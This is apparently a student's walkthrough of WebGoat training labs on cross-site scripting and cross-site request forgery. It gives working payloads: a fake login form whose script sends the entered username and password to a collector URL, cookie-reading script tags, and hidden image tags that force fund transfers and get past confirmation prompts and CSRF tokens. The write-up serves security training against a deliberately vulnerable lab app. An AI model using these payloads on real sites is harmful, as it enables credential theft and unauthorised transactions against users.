# Phishing with XSS

Create a HTML form with 2 input fields and 1 submit button. When this button is clicked, we can see that it could our javascript code `alert('1')`

```javascript
<script>
function login() {
    alert("This is the login function!");
}
</script>
```

```html
<h1>Login required!</h1><br>
Enter username: <input type="text" id="username"><br>
Enter password: <input type="password" id="password"><br>
<input type="submit" name="login" onclick="login()">
```

The code for collecting the credentials will be replacing the code  `"alert('1')"`. The javascript will be made up of getting the user text field (id = `username`) and password field (id =  `password`).

Using javascript we can retrieve these values by simply:
(for username) `document.getElementById("username").value`
(for password) `document.getElementById("password").value`

Modifying the whole HTML code to

```html
<h1>Login required!</h1><br>
Enter username: <input type="text" id="username"><br>
Enter password: <input type="password" id="password"><br>
<input type="submit" name="login" onclick="login()">
```

```javascript
<script>
function login() {
    var temp=new Image();
    temp.src="http://http://192.168.247.135/WebGoat/catcher?PROPERTY=yes&user=" + document.getElementById("username").value+"&password="+document.getElementById("password").value;
}
</script>
```

## Lab: Stage 1 - Stored XSS

Login in with as Tom and update his profile's street as `<script>alert(1)</script>` . 

Login as Jerry this time and view Tom's profile to see the stored XSS gets triggered.

## Lab: Stage 2 - 4 (skipped)

developer version only

## Lab: Stage 5 - Reflected XSS

Login in with any user eg. Larry and perform XSS using the search input field `<script>alert(1)</script>` .

## Lab: Stage 6  skipped

developer version only

## Stored XSS Attacks

This is a public message board and if you put in an XSS script as a message and submit it. Anyone who views this will allow the script payload to be triggered.

**Title:** `Test`

**Message:** `<script>alert(document.cookie)</script>`

Click the message 'Test' in the message list to complete the challenge.

## Reflected XSS Attacks

Test all input for XSS and you will solve the challenge when you `<script>alert(1)</script>` in the 'Enter your three digit access code' input field.

*Notes: A good reflected XSS attack example was if this is a search field that is vulnerable to XSS. And our search key words is being used in a HTTP GET url, you could use a javascript payload and somehow trick the victim to click it, executing the payload in the user's context. Eg. You could make the script send the victim's cookies or session details back to you*

# Cross Site Request Forgery (CSRF)

Right click and copy link from the left side menu, then include it in the Message body of email.

`<img src=http://192.168.247.135/WebGoat/attack?Screen=52&menu=900&transferFunds=4000 width="1" height="1"></img>`

When the user clicks it, `transferFunds=4000` will be executed. 

# CSRF Prompt By-Pass

To by-pass the confirm prompt, we will use 2 seperate img element to send 2 different HTTP GET request (1) `transferFunds=4000` and (2) `transferFunds=CONFIRM`

Use the following script below:

```html
<img src="http://192.168.247.135/WebGoat/attack?Screen=45&menu=900&transferFunds=4000" onerror="document.getElementById('hackImage').src='http://192.168.247.135/WebGoat/attack?Screen=45&menu=900&transferFunds=CONFIRM'" />
<img id="hackImage" />
```

What this does is it will first make a HTTP GET request to the given URL with `transferFunds=4000` (which will request a transfer funds of 4000 and waiting for confirmation to continue), since this isnt a valid image source and will become an broken link error, the `onerror` part fires off the second part of the code to 'attach' our code `transferFunds=CONFIRM` to the 2nd image we created named "hackImage", since we are setting it's source, the image will try to load when the page is refreshed. Effectively triggering the second GET request to CONFIRM the transfer.

# CSRF Token By-Pass

To find out what is the CSRF Token attribute name. Navigate to the given parameter `http://192.168.247.135/WebGoat/attack?Screen=2&menu=900&transferFunds=main` . Enter some value in this textbox and use burp suite to intercept the traffic when you click `Submit`

Observe attribute `....&CSRFToken=-1438237164`. Also, if you inspect the form elements, you will see that there is an attribute `<input name="CSRFToken" type="hidden" .......>`.

```html
<script> 
    function getToken(){ 
        return document.forms["form"].elements["CSRFToken"].value;
    }
</script>

<img src="http://192.168.247.135/WebGoat/attack?Screen=2&menu=900&transferFunds=main" onerror="var url='http://192.168.247.135/WebGoat/attack?Screen=2&menu=900&transferFunds=9999&CSRFToken='+getToken(); document.getElementById('imageHack2').src=url" />

<img id="imageHack2" />
```

```javascript
xhttp = new XMLHttpRequest(); 
xhttp.responseType = "document"; 
xhttp.open("GET", "http://192.168.247.135/WebGoat/attack?Screen=2&menu=900&transferFunds=main");
xhttp.send();
//somehow this part below will error "Cannot read property of null, it is possible that the 'xhttp.send()' havent return yet and the next line of code started already.
var token = xhttp.response.forms["form"].elements["CSRFToken"].value;
console.log("here!");
console.log(token);
```
